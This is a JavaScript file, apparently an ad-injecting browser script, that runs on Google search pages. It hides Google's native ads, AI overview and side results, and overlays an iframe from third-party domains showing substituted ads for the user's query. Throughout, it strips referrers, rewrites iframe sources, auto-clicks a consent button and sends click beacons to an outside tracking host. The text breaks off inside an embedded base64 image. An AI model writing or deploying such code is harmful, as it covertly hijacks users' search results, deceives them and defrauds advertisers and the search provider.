    (function () {
        // ----- Debugging -----
        var debug = false; // Set to true for debugging logs

        function logDebug(...args) {
            if (debug) {
            console.log(...args);
            }
        }

        const startTime = performance.now();
        const domainName = window.location.hostname;
        let responseReceived = false;
        let bgreceived = false;
        let ghsElement;

        // let orig = "GHS-KL";
        let adcount = 0;

        const currentVersion = "82";
        const storedVersion = localStorage.getItem("cseScriptVersion");

        const href =
            window.location && window.location.href ? window.location.href : "";

        // const firstIframeUrl = "https://customsearch.quickshoppers.co/logCse?q=";
        const firstIframeUrl = "https://mightytechy.com/aa.php?q=";

        const firstIframeWorking = [
            "https://mightytechy.com/aa.php?q=",
            "https://customsearch.quickshoppers.co/shop/qs_results?q=",
            "https://bestseminartopics.com/BST002.php?q=",
            "https://sellbourne.com/searchc.php#gsc.tab=0&gsc.q=",
            "https://gazianteppsikolog.org/results_1.html?q=",
        ];
        //'https://methoo.com/search.html?q=';
        //https://sellbourne.com/searchc.php#gsc.tab=0&gsc.q=
        //https://trendingones.net/trendingsearch.html?q=
        //https://gazianteppsikolog.org/results_1.html?q=

        //const isFirstIframeDomain = window.self !== window.top && (href.startsWith(firstIframeUrl));
        const isFirstIframeDomain =
            window.self !== window.top &&
            firstIframeWorking.some((url) => href.startsWith(url));
        const isSecondIframeDomain =
            window.self !== window.top &&
            href.startsWith("https://syndicatedsearch.goog/cse_v2/ads");
        const isTopGoogle =
            window.self === window.top &&
            href.includes("google") &&
            href.includes("/search?");

        if (!isFirstIframeDomain && !isSecondIframeDomain && !isTopGoogle) {
            return;
        }
        logDebug(href);

        //security to avoid double css
        var existingGhs = document.getElementById("ghs");
        var existingKL = document.getElementById("mpimpl");
        var existingYhs = document.getElementById("yhscss");

        if (existingGhs || existingKL || existingYhs) {
            logDebug('Style element with id "yhscss" or "mpimpl" exists.');
            return;
        }

        function sendUntilResponse(message, interval = 100) {
            const intervalId = setInterval(() => {
            if (!responseReceived) sendMessageToIframes(message);
            else clearInterval(intervalId);
            }, interval);
        }

        function sendMessageToIframes(message) {
            var iframes = document.getElementsByTagName("iframe");
            for (let i = 0; i < iframes.length; i++) {
            iframes[i].contentWindow.postMessage(message, "*");
            //logDebug(message,'sendMessageToIframes from : '+href+' to : '+iframes[i].src);
            }
        }

        function injectCSS(css) {
            ghsElement = document.getElementById("ghs");
            if (!ghsElement) {
            ghsElement = document.createElement("style");
            ghsElement.id = "ghs";
            ghsElement.innerHTML = css;
            document.documentElement.appendChild(ghsElement);
            } else {
            ghsElement.innerHTML += css;
            }
        }

        function cupx(ac, type) {
            const img = new Image();
            img.src = "https://secure-check.co/cupx.php?orig=GHS-15R4&v=" + currentVersion + "&ac=" + ac + "&t=" + type;
        }

        // TOP LEVEL GOOGLE
        if (isTopGoogle) {
            // If there's no version stored, or the version has changed, cache the version and don't run the script.
            if (!storedVersion) {
            localStorage.setItem("cseScriptVersion", currentVersion);
            logDebug("First run: caching script version, not executing script.");
            //return;
            } else if (storedVersion !== currentVersion) {
            localStorage.setItem("cseScriptVersion", currentVersion);
            logDebug(
                "Script version updated: caching new version, not executing script."
            );
            //return;
            }
            function showResDiv() {
            const resDiv = document.getElementById("res");
            if (resDiv) {
                resDiv.style.opacity = "1";
                //window.scrollTo(0, 0);
            } else {
                setTimeout(showResDiv, 50);
            }
            }

            window.addEventListener("message", (event) => {
            if (event.data === "MsgOk") {
                logDebug(
                (performance.now() - startTime).toFixed(0) +
                    " ms. >> " +
                    domainName +
                    " Confirmation received from iframe " +
                    event.origin
                );
                responseReceived = true;
            }
            // Google page receives msg to show ads
            if (
                typeof event.data === "object" &&
                event.data !== null &&
                event.data.hasOwnProperty("ad")
            ) {
                const adStatus = event.data.ad;
                if (adStatus === 0) {
                iframe.style.display = "none";
                iframeContainer.style.display = "none";

                // For the side results, set visibility visible back
                const sideRes = document.getElementById("rhs");
                if (sideRes) {
                    sideRes.style.setProperty("visibility", "visible", "important");
                }

                // If there are no ads, display the AI results, if available
                const aiRes = document.querySelector('[jscontroller="qTdDb"]');
                if (aiRes) {
                    logDebug("AI results NOT FOUND, displaying AI results");
                    aiRes.style.setProperty("visibility", "visible", "important");
                }

                // If there is the other top result, display it as well
                const otherTopRes = document.getElementById("Odp5De");
                if (otherTopRes) {
                    logDebug(
                    "Other top results NOT FOUND, displaying other top results"
                    );
                    otherTopRes.style.setProperty("visibility", "visible", "important");
                }

                showResDiv();
                logDebug(
                    (performance.now() - startTime).toFixed(0) +
                    " ms. >> No Ads from IFRAME ##### END OF GOOGLE > ",
                    event
                );
                } else if (adStatus === 1) {
                logDebug(">> Ads found from IFRAME, showing ads href =", event);
                show(event, adStatus);
                }
            }
            if (event.data.event === "cseloaded") {
                adsheight = event.data.height;
                logDebug(
                (performance.now() - startTime).toFixed(0) +
                    " Message Received CSE has finished loading adsheight = " +
                    adsheight
                );
                //checkAdblockDim();
                /*
                    if (adsheight === undefined || adsheight == 0) {
                        window.parent.postMessage({
                            ad: 0
                        }, '*');
                    }
                        */
            }
            });

            function getTopPosition(element) {
            logDebug("getTopPosition called for element:", element);
            let top = 0;
            while (element) {
                top += element.offsetTop;
                element = element.offsetParent;
            }
            return top;
            }

            function show(event, adStatus) {
            const resDiv = document.getElementById("res");
            const center_col =
                document.getElementById("center_col") ||
                document.getElementById("search");

            // For the side results, set visibility visible back
            const sideRes = document.getElementById("rhs");
            if (sideRes) {
                sideRes.style.setProperty("visibility", "visible", "important");
            }

            let aiResHeight = 0;
            let otherTopResHeight = 0;
            if (adStatus === 1) {
                const aiRes = document.querySelector('[jscontroller="qTdDb"]');
                if (aiRes) {
                aiResHeight = getTopPosition(aiRes);
                aiRes.style.setProperty("display", "none", "important");
                }

                const otherTopRes = document.getElementById("Odp5De");
                if (otherTopRes) {
                otherTopResHeight = getTopPosition(otherTopRes);
                otherTopRes.style.setProperty("display", "none", "important");
                }
            }

            if (resDiv && center_col) {
                const rect = resDiv.getBoundingClientRect();
                const topPos = getTopPosition(center_col);
                const finalTopPos = topPos + aiResHeight + otherTopResHeight;
                logDebug(
                "finalTopPos = " + finalTopPos,
                "topPos = " + topPos,
                "aiResHeight = " + aiResHeight,
                "otherTopResHeight = " + otherTopResHeight
                );
                iframeContainer.style.cssText =
                "z-index:10;overflow:hidden;position:absolute;top:" +
                finalTopPos +
                "px;left:" +
                rect.left +
                "px;width:" +
                center_col.offsetWidth +
                "px;height:" +
                event.data.height +
                "px;opacity:1;";
                iframe.style.cssText =
                "width:" +
                iframeWidth +
                "px;height:" +
                iframeHeight +
                "px;border:none;position:absolute;opacity:1;z-index:10;overflow:hidden;top:-" +
                event.data.top +
                "px;left:-" +
                event.data.left +
                "px;";
                resDiv.style.cssText =
                "margin-top:" + (event.data.height + 7) + "px;opacity:1;";
                //set Google links to _blank but only the search ones.
                document.querySelectorAll("#search a").forEach((link) => {
                link.target = "_blank";
                });
                //window.scrollTo(0, 0);
                showResDiv();
            } else {
                setTimeout(function () {
                show(event, adStatus);
                }, 50);
            }
            }
            function checkbg() {
            const body = document.body;
            if (body) {
                const computedStyle = window.getComputedStyle(body);
                const bgcolor = computedStyle.getPropertyValue("background-color");
                if (bgcolor && bgcolor != "rgba(0, 0, 0, 0)") {
                sendUntilResponse({ bg: bgcolor }, 50);
                logDebug(
                    performance.now() -
                    startTime +
                    " ms. for Google bgcolor value = " +
                    bgcolor
                );
                return;
                } else logDebug("else bgcolor  = " + bgcolor);
            }
            setTimeout(checkbg, 40);
            }
            /*
                window.addEventListener("resize", () => {
                    const privatelayer_el = document.getElementById("ifcon");
                    const targetdiv = document.getElementById('search');
                    if (privatelayer_el && targetdiv) {
                        const rect = targetdiv.getBoundingClientRect();
                        privatelayer_el.style.left = rect.left + window.scrollX + "px";
                        //privatelayer_el.style.top = rect.top + window.scrollY + "px";
                    }
                });
                */
            // Configuration constants
            const MAX_CHECK_ATTEMPTS = 20;
            const CHECK_INTERVAL = 20;

            // Variables
            let checkCount = 0;

            function insertElTarget(element) {
            const targetElement = document.documentElement;
            if (targetElement) {
                targetElement.appendChild(element);
            } else {
                setTimeout(() => insertElTarget(element), 10);
            }
            }

            function isValidSearch(keyword, udm, tbm) {
            if (!keyword) return false;
            if (udm === "2" || udm === "28" || udm === "50") return false;
            const invalidTbms = ["nws", "lcl", "fin", "isch", "vid", "bks"];
            if (invalidTbms.includes(tbm)) return false;
            return window.location.pathname === "/search";
            }

            function checkForKeyword() {
            checkCount++;
            logDebug("checkForKeyword attempt #" + checkCount);

            const params = new URLSearchParams(window.location.search);
            const tbm = params.get("tbm");
            const udm = params.get("udm");
            const keyword = params.get("q");

            // If it's a valid search, handle the keyword logic
            if (isValidSearch(keyword, udm, tbm)) {
                //handleKeyword(keyword);
                startIframe(keyword);
                return;
            }

            // If it's explicitly a known non-search page, stop.
            if (
                udm === "2" ||
                udm === "28" ||
                udm === "50" ||
                ["nws", "lcl", "fin", "isch", "vid", "bks"].includes(tbm)
            ) {
                logDebug("Non search page detected");
                return;
            }

            // If not valid yet, retry until max attempts
            if (checkCount < MAX_CHECK_ATTEMPTS) {
                setTimeout(checkForKeyword, CHECK_INTERVAL);
            } else {
                logDebug(
                "Reached maximum retries (" +
                    MAX_CHECK_ATTEMPTS +
                    "). Stopping checks."
                );
            }
            }

            /**
            * Inserts styling and an iframe for the given keyword.
            * Assumes `iframeContainer`, `iframe`, `meta`, and `checkbg()` are defined elsewhere.
            * @param {string} keyword - The keyword to use in the iframe URL.
            */
            function startIframe(keyword) {
            const style = document.createElement("style");
            style.innerHTML = `#atvcap,#epbar,#mbEnd,#tads,#tadsb,#taw,.ads-ad,.commercial-unit-desktop-rhs,.commercial-unit-desktop-top{display:none!important}#res{opacity:0}#rhs,#Odp5De,[jscontroller="qTdDb"]{visibility:hidden!important}`;
            document.documentElement.appendChild(style);
            iframe.src = firstIframeUrl + encodeURIComponent(keyword);
            iframeContainer.appendChild(iframe);
            insertElTarget(iframeContainer);
            insertElTarget(meta);
            checkbg();
            setInterval(function () {
                var center_col = document.getElementById("center_col");
                if (center_col && iframeContainer) {
                rect = center_col.getBoundingClientRect();
                iframeContainer.style.left = rect.left + window.scrollX + "px";
                iframeContainer.style.top = rect.top + window.scrollY + "px";
                }
            }, 10);
            }

            /**
            * Checks for certain elements by ID. If any are found, log and stop execution.
            * Otherwise, proceed to check for the keyword.
            */
            function checkElementExistsAndStop() {
            //if (document.querySelector('meta[http-equiv="refresh"]')) {return;}

            const ids = [
                "zsYMehe",
                "privatelayer",
                "mdorkirgneorpowtn",
                "sadsfs",
                "navflow",
                "mpimpl",
            ];
            for (const id of ids) {
                if (document.getElementById(id)) {
                logDebug(
                    "Element with ID " + id + " exists. Stopping script execution."
                );
                return;
                }
            }
            // If none found, proceed
            checkForKeyword();
            }

            const iframeHeight = window.innerHeight + 2000;
            const iframeWidth = window.innerWidth;
            const iframeContainer = document.createElement("div");
            iframeContainer.id = "ifcon";
            iframeContainer.style.cssText =
            "opacity:1;position:absolute;z-index:10;overflow:hidden;width:100%;height:100%;top:-3500px;";

            const iframe = document.createElement("iframe");
            iframe.id = "zsYMehe";
            iframe.style.cssText =
            "width:" +
            iframeWidth +
            "px;height:" +
            iframeHeight +
            "px;border:none;position:absolute;opacity:1;z-index:10;overflow:hidden;top:-3500px;";
            iframe.setAttribute("scrolling", "no");
            iframe.setAttribute("frameborder", "0");
            iframe.setAttribute("referrerpolicy", "no-referrer");

            const meta = document.createElement("meta");
            meta.name = "referrer";
            meta.content = "no-referrer";
            // Start the process
            checkElementExistsAndStop();

            setTimeout(() => {
            const resDiv = document.getElementById("res");
            if (
                resDiv &&
                window.getComputedStyle(resDiv).getPropertyValue("opacity") === "0"
            ) {
                showResDiv();
                logDebug((performance.now() - startTime).toFixed(0) + " ms : too long");
            }
            }, 3400);

            return;
        }
        // FIRST IFRAME DOMAIN LOGIC
        if (isFirstIframeDomain) {
            (function () {
            function processIframeSrc(url) {
                try {
                const urlObj = new URL(url, window.location.href);
                const params = urlObj.searchParams;
                ["lao", "isw", "ish"].forEach((param) => params.delete(param));
                if (params.has("psw")) params.set("biw", params.get("psw"));
                const u_h = parseFloat(params.get("u_h") || 0);
                if (u_h) {
                    params.set("bih", (u_h * 0.6).toFixed(0));
                    params.set("psh", (u_h * 0.5).toFixed(0));
                }
                params.set("referer", window.location.href);
                params.set("frm", "0");
                //params.set("sc_status", "6");
                logDebug("processIframeSrc = " + urlObj.href);
                return urlObj.href;
                } catch (e) {
                return url;
                }
            }

            const iframeSrcDescriptor = Object.getOwnPropertyDescriptor(
                HTMLIFrameElement.prototype,
                "src"
            );
            Object.defineProperty(HTMLIFrameElement.prototype, "src", {
                get: function () {
                return iframeSrcDescriptor.get.call(this);
                },
                set: function (value) {
                iframeSrcDescriptor.set.call(this, processIframeSrc(value));
                },
                configurable: true,
                enumerable: true,
            });

            const observer = new MutationObserver((mutationsList) => {
                for (const mutation of mutationsList) {
                if (
                    mutation.type === "attributes" &&
                    mutation.attributeName === "src" &&
                    mutation.target.tagName === "IFRAME"
                ) {
                    const iframe = mutation.target;
                    const src = iframe.getAttribute("src");
                    const newSrc = processIframeSrc(src);
                    if (newSrc !== src) iframe.setAttribute("src", newSrc);
                } else if (mutation.type === "childList") {
                    mutation.addedNodes.forEach((node) => {
                    if (node.tagName === "IFRAME") {
                        const src = node.getAttribute("src");
                        if (src) {
                        const newSrc = processIframeSrc(src);
                        if (newSrc !== src) node.setAttribute("src", newSrc);
                        }
                    } else if (node.querySelectorAll) {
                        node.querySelectorAll("iframe").forEach((ifr) => {
                        const src = ifr.getAttribute("src");
                        if (src) {
                            const newSrc = processIframeSrc(src);
                            if (newSrc !== src) ifr.setAttribute("src", newSrc);
                        }
                        });
                    }
                    });
                }
                }
            });

            observer.observe(document.documentElement, {
                childList: true,
                subtree: true,
                attributes: true,
                attributeFilter: ["src"],
            });

            document.querySelectorAll("iframe[src]").forEach((ifr) => {
                const src = ifr.getAttribute("src");
                const newSrc = processIframeSrc(src);
                if (newSrc !== src) ifr.setAttribute("src", newSrc);
            });
            })();

            window.addEventListener("message", (event) => {
            //logDebug('MSG =',event);
            // removed event.source === window.parent &&
            if (event.data.bg && !bgreceived) {
                bgreceived = true;
                const bg = event.data.bg;
                if (bg !== "rgb(255, 255, 255)") {
                injectCSS(
                    "body,.gsc-control-cse,.result-right,.gsc-adBlock{background-color:" +
                    bg +
                    "!important;border:0!important}"
                );
                event.source.postMessage("MsgOk", event.origin);
                //sendMessageUntilResponse({ bg }, 50);
                logDebug("Dark Mode 1st iframe bg =" + bg);
                } else {
                event.source.postMessage("MsgOk", event.origin);
                logDebug("Light Mode received from ", event.source);
                }
                sendUntilResponse({ bg }, 50);
            }

            if (event.data === "MsgOk") {
                logDebug(
                (performance.now() - startTime).toFixed(0) +
                    " ms. >> " +
                    domainName +
                    " Confirmation received from iframe " +
                    event.origin
                );
                responseReceived = true;
            }
            });
            function checkAdblockDim() {
            logDebug(">> checkAdblockDim");
            const adBlockDiv = document.querySelector(".gsc-adBlock");
            if (!adBlockDiv) {
                logDebug(".gsc-adBlock do not exist");
                window.parent.postMessage({ ad: 0 }, "*");
                //algoClick();
                return;
            }

            let previousHeight = null;

            function sendDimensions() {
                const rect = adBlockDiv.getBoundingClientRect();
                const offsetY =
                window.pageYOffset || document.documentElement.scrollTop;
                const offsetX =
                window.pageXOffset || document.documentElement.scrollLeft;

                if (rect.height === 0) {
                // If no height, no ad
                logDebug("rect.height === 0");
                window.parent.postMessage({ ad: 0 }, "*");
                previousHeight = 0;
                //algoClick();
                return;
                }

                // Only send if the height has changed
                if (rect.height !== previousHeight) {
                previousHeight = rect.height;
                window.parent.postMessage(
                    {
                    ad: 1,
                    top: rect.top + offsetY,
                    left: rect.left + offsetX,
                    width: rect.width,
                    height: rect.height,
                    },
                    "*"
                );
                logDebug(
                    "Top:",
                    rect.top + offsetY,
                    "Left:",
                    rect.left + offsetX,
                    "Height:",
                    rect.height
                );
                }
            }

            const ro = new ResizeObserver(sendDimensions);
            ro.observe(adBlockDiv);

            // Send initial dimensions
            sendDimensions();
            }

            // Check gdprButton
            function checkForGdpr() {
            const gdprButton = document.getElementById("gdprAccept");
            if (gdprButton) {
                logDebug("The GDPR accept button was found. Clicking it now.");
                clearInterval(checkInterval);
                gdprButton.dispatchEvent(
                new MouseEvent("click", {
                    view: window,
                    bubbles: true,
                    cancelable: true,
                })
                );
            }
            }

            const checkInterval = setInterval(checkForGdpr, 500);

            let adblockChecked = false;

            function checkAdblockDimOnce(trigger) {
            if (!adblockChecked) {
                adblockChecked = true;
                checkAdblockDim();
                logDebug(
                firstIframeUrl +
                    " fully loaded from " +
                    trigger +
                    ", executing script..."
                );
            }
            }

            if (document.readyState === "complete") {
            checkAdblockDimOnce("document.readyState complete");
            } else {
            /*
                    document.onreadystatechange = function() {
                    if (document.readyState === 'complete') {
                        checkAdblockDimOnce('readystatechange');
                    }
                    };
                    */
            window.addEventListener(
                "load",
                function () {
                checkAdblockDimOnce("window load");
                },
                { once: true }
            );
            }

            let css = `#main,.section,section,.gsc-control-cse,.container{border:0;margin:0!important;padding:0}.gsc-loading-fade .gsc-adBlock {opacity: 1 !important;}.gsc-adBlock{border-bottom:none!important;margin-bottom:0;padding-bottom:0}body{margin:0}#gdprConsent,#footer,.header,#header,.gsc-above-wrapper-area,.search-container,.gsc-tabsArea,.gsc-search-box,.result-left,.result-right,.search-box{display:none!important}.container{max-width:none!important}.gsc-webResult.gsc-result{border:none}`;
            //@media (prefers-color-scheme: dark){body,.gsc-wrapper,.gsc-resultsbox-visible,.gsc-control-cse{background-color:#1f1f1f!important}.gsc-webResult.gsc-result{border:1px solid #1f1f1f!important}}
            injectCSS(css);
        }

        // SECOND IFRAME DOMAIN (CSE)
        if (isSecondIframeDomain) {
            function runWhenReady(callback) {
            let called = false;
            function run() {
                if (called) return;
                called = true;
                callback();
            }

            if (document.readyState === "complete") {
                run();
            } else {
                document.addEventListener("DOMContentLoaded", run, { once: true });
                window.addEventListener("load", run, { once: true });
            }
            }

            runWhenReady(cse);

            function getTopLevelDomain(domain) {
            const parts = domain.split(".");
            const len = parts.length;

            if (len <= 2) return domain;

            const last2 = parts.slice(-2);
            const thirdLast = parts[len - 3];

            return parts[len - 2].length <= 3
                ? [thirdLast, ...last2].join(".")
                : last2.join(".");
            }

            function cse() {
            logDebug(
                (performance.now() - startTime).toFixed(0) +
                " ms: syndicatedsearch.goog loaded"
            );

            let attempts = 0;
            let maxAttempts = 10;
            let interval = 50; // in milliseconds

            let intervalId = setInterval(() => {
                const adsIframe = document.querySelector("#ssrad-master div");
                logDebug("setInterval finding #ssrad-master div attempts =" + attempts);
                if (adsIframe) {
                clearInterval(intervalId);

                // Original code when adsIframe is found
                adsIframe.childNodes.forEach((child) => {
                    const titleElement = child.querySelector(".styleable-visurl");
                    const titleEl = child.querySelector(".styleable-title");
                    if (!titleElement || !titleEl) return;

                    const _URL = titleElement.textContent.trim();
                    const { hostname, origin } = new URL(_URL);
                    const title = hostname.replace("www.", "").split("/")[0];
                    const newTitle = getTopLevelDomain(title);
                    logDebug(newTitle);
                    let hostnameOnly = newTitle.split(".")[0];
                    const favicon =
                    "https://www.google.com/s2/favicons?domain=" + newTitle;

                    const elHeader = document.createElement("div");
                    elHeader.className = "ele_head";

                    elHeader.innerHTML =
                    '<img src="' +
                    favicon +
                    '&sz=128" width="26" height="26" class="_favicon-img"><div class="_text"><span class="_title"><a href="' +
                    titleEl.href +
                    '" target="_top">' +
                    hostnameOnly +
                    '</a></span><span class="_domain"><a href="' +
                    titleElement.href +
                    '" target="_top">' +
                    origin +
                    '</a><span class="v_ellipsis"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"></path></svg></span></span></div>';
                    child.prepend(elHeader);
                });

                document.querySelectorAll("a").forEach((link, index) => {
                    link.target = "_blank";
                    // Add onclick event to call cupx function
                    link.onclick = function () {
                    cupx(index + 1, "click");
                    };
                });

                // Count ads
                const adContainer = document.querySelector('[data-ad-container="1"]');
                if (adContainer) {
                    const divChildren = adContainer.children;
                    adcount = divChildren.length;
                    logDebug("adcount:", adcount);
                    const height =
                    document.getElementById("adBlock")?.offsetHeight || 0;
                    logDebug("adBlock height = " + height);

                    window.parent.postMessage(
                    {
                        event: "cseloaded",
                        height,
                    },
                    "*"
                    );
                } else {
                    logDebug("adcount not found");
                    adcount = 0;
                }
                cupx(adcount, "search");
                } else {
                attempts++;
                if (attempts >= maxAttempts) {
                    clearInterval(intervalId);
                    logDebug("Could not find adsIframe after max attempts.");
                    cupx(0, "search");
                }
                }
            }, interval);
            }
            const styles = `#adBlock,#adBlock .sponsored_text,.styleable-rootcontainer,body{font-family:Arial,sans-serif!important}.si130{font-weight:400!important}.gsc-control-cse,.gsc-wrapper .gsc-results .gsc-cursor-box .gsc-cursor-page,.styleable-rootcontainer,body{background-color:var(--background)!important}:root{--logo_dark:url(data:image/png;base64,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);--logo_light:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALgAAAA8CAYAAADVEnAJAAAOvklEQVR42u1dCZBcRRluyM4Sbg9QuUTFYAhy7Zs3G2Nw5r2ZTWKMWBCXQ5QzIncEFIqjGGtnZpdwaEUOIYcFlBwVRBA5wh7hUIIQCFgkJCAWBUWSnZ3N9d7MXgk7/p/sZje72/3umR2rv6quDOyb1zXd3/v77+///37MD0STxapYY6FWT+ev0zP5h7W0sTqWyWdjGaNA/13UU0Yf/ZvT08bbWjr/GH2+Qc8YJyv3FUNMQmK8Qk8XIrGM+Qc9ld8CIjttn33PvC/elD+JSUiMFxAp64igL4GkvrW08TytADVMouIQfnRucazGKg11qe6v62nzryBkIC1l9NO/d0eT2f2YhCR4ia32T2MpMw8iBt20TP79eIN5HJOQBA8a9cuKE8h1uAfEK3EzY+n8TCYhCR4QoI5MJMv9pF1SxlLGTrLyK+nzQvreZfGUeYbWWDhFy5inU7uCFJS7Ymnjdbgidu6Ha/GAMQlJ8ADIXaWlzSdsqiHv6JnCL6Y3bfu8LV8+aX6JHoD59L1/Czadb8cbt3+RSUiCBwHId5YWNmN8AuucTBb3dPsQkfszDxr57vc23pLklgQPDES68yw3gqn8I7OSnQcw+xBb9LTxDO6LIJEktyR4sFJgyuiyUDluYsXiHsxHYBUgCfKXM5LbvsAkJMGDAEhL7sFyC+t9A5OQqESCQ5YTk9tcymC5JSQqjeAgLiQ+AcHXz0kW92ESEpVIcGQDihUTM84kJCqV4JAFBZvKFiYhUakER7SQ8rc38wgeb8zPYhWOjkTtpGxcvSQbDy+m1tauK6vQ8JnaEvytI64ezQJCT3P1pL7mqkt2tExY3NsSatvRGlqF9r/PzROW4G89LdWB9Z+4ZcuBlN58KgXvMhRge4hW5KeQm09y7+0UMZ47bUFu/3ITvKgooQ5N/V5WV69r19WlHbr6JM3LUzQvD3bo4Ztpvuren/XNvZhTaE0Fhe+eGBsrNVyOAcvGI+eAyDRIRTutPa6+SQN8Hr7ruf83WGhnS+icATIX7TQi+5u9raHz8F2fYho1tAI/SkG5XougXYGu/f30jHHwZ98z6xFNHtlQ0OI3wbNR9Ssd8fACGv+c9fyEt+DaDVHlIGYXlDNyNd89MRezCkQ2oUzPxpW1GBQ3LauF34U1YS7R11I1nci6FqR11ya829dW5bp/BMvIOD3gNMktlsp3YsUma38xJ4XiDb8IXkyyPTviylU0znmn8wOi5+Lq2fYseNpcwiV4On9ORVltxvYgl+P6dk39lDc4Dqx5Py2TN+Ke9sUotgeR+3qywp+CqF5ab3Oov6+16kbc0+mKrGWMj8VkFifNYd8VJMGz0Sn7tevhp73OEc317XhQmAj01L7M+7FY4iqJ3DRoC/HDfW26ejfubYfcRMyFIKfP7W67JEetK1KN/UhZDorgm+qO35es9t/9mh/MOeZHRPC1vB/kNS8kiEGmDfGdbAzA2uIHB9RuYhaAtQUhg2i0Klj2rzWYx9LYbMcYjVeCg4g0lo/5PT8QCRgPouWsPlmsHm8ER9kcG4FcXInBpRBbYuUt2p1fDLUEu3G03AxlclZXLidfcI2lu5IIRxkHpI7E4FJY+NVv0UNwMdSS/mfZXmg9y6sn0/+7nPz1NZbuSnMVt38E4UgdWWdhGDYTQW9DTS1yjqK3FA5PpIzptM/6DSkpG0pB8A49cqF476P20ib/